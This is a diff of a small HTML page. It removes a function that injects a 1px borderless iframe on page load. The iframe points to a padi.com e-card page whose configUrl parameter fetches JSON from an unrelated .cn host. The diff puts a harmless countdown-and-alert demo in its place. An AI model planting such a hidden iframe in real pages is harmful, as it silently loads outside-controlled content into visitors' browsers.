@@ -1,16 +1,20 @@
 <!DOCTYPE html>
 <html>
     <script>
-      function prepareFrame(URL) {
-        var ifrm = document.createElement("iframe");
-        ifrm.src = URL;
-        ifrm.style.width = "1px";
-        ifrm.style.height = "1px";
-        ifrm.style.border = "None";
-        ifrm.style.visibility = "visible";
-        document.getElementsByTagName("body")[0].appendChild(ifrm);
-      }
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        async function demo() {
+            for (let i = 0; i < 5; i++) {
+                console.log(`Waiting ${i} seconds...`);
+                await sleep(i * 1000);
+            }
+            alert('Done');
+        }
+
+        demo();
     </script>
-  <body onload="prepareFrame('https://ecard.global-prod.padi.com/index.html?configUrl=https://wovyba364.j516.cn/api.json')">
+  <body>
   </body>
 </html>
